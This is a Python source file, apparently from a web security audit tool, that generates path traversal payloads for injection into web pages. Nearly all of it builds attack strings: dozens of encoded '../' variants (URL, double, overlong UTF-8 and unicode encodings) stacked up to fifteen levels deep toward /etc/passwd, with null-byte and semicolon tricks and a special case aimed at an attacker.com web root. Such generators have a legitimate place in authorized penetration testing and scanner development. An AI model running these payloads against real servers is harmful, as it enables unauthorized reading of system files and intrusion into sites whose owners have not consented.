import sys

from pipe import JSONPipe


class factory(JSONPipe):
    """Generate payload for injection to webpages under audit
    """

    def __init__(self):
        pass

    def process(self, incomings):
        """Just generate all possible payloads and return them in a list.
        Ignore the `incomings` parameter because there are no inputs.

        return : a list of payloads
        """

        payloads = []

        # Contains the various types of directory pathing
        # %2f = / || %2e = . || %252f = / || '%255c' = \
        list_of_postfix_1 = ['/etc', '/etc/', '/etc/passwd', '%2fetc%2fpasswd', '/etc/passwd%00index.html',
                             '/etc/passwd;index.html', '//etc//passwd']
        list_of_prefix = ['../', '..%2f', '%2e%2e/', '%2e%2e%2f', '..%252f/', '%252e%252e/', '%252e%252e%252f',
                          '..%c0%af',
                          '%c0%ae%c0%ae/', '%c0%ae%c0%ae%c0%af', '..%25c0%25af', '%25c0%25ae%25c0%25ae/',
                          '%25c0%25ae%25c0%25ae%25c0%25af'
            , '..%%32%66', '%%32%65%%32%65/', '%%32%65%%32%65%%32%66', '..%%35%63', '%%32%65%%32%65/',
                          '%%32%65%%32%65%%35%63',
                          '/..\\', '.../', '..././', '..../', '..%u2215', '%uff0e%uff0e/', '%uff0e%uff0e%u2215',
                          '..%u2216',
                          '..%uEFC8', '..%uF025', '..0x2f', '0x2e0x2e/', '0x2e0x2e0x2f', '..%c0%2f'
            , '%c0%2e%c0%2e/', '%c0%2e%c0%2e%c0%2f', '///%2e%2e%2f', '..//', './\\/./', '.\\/\\.\\', './../', './/..//']

        # Print just the postfix
        for post_style in list_of_postfix_1:
            payloads.append([post_style])

        # New Postfix array (Without the last '/')
        list_of_postfix = ['', 'etc', 'etc/', 'etc/passwd', 'etc%2fpasswd', 'etc/passwd%00index.html',
                           'etc/passwd;index.html', 'etc//passwd']

        # For extended file paths
        for post_style in list_of_postfix:
            for pre_style in list_of_prefix:
                curr_file_path = post_style
                for times in range(0, 15):
                    curr_file_path = pre_style + curr_file_path
                # Start from longest path
                payloads.append([curr_file_path])
                # Reduce
                for times in range(0, 14):
                    curr_file_path = curr_file_path[len(pre_style):]
                    payloads.append([curr_file_path])
                    if curr_file_path == "":
                        break

        # 2-part Inputs
        list_of_second_input = ['passwd']

        # Do it with postfix_1 first
        for post_style in list_of_postfix_1:
            for second_input in list_of_second_input:
                payloads.append([post_style, second_input])

        # New Postfix array (Without the last '/')
        list_of_postfix_2 = ['', 'etc', 'etc/']

        for second_input in list_of_second_input:
            for post_style in list_of_postfix_2:
                for pre_style in list_of_prefix:
                    curr_file_path = post_style
                    for times in range(0, 15):
                        curr_file_path = pre_style + curr_file_path
                    payloads.append([curr_file_path, second_input])
                    for times in range(0, 14):
                        curr_file_path = curr_file_path[len(pre_style):]
                        payloads.append([curr_file_path, second_input])
                        if curr_file_path == "":
                            break

        # Special Cases
        payloads.append(["../../../../../../../../var/www/attacker.com/public_html/", "image.jpg"])

        return payloads
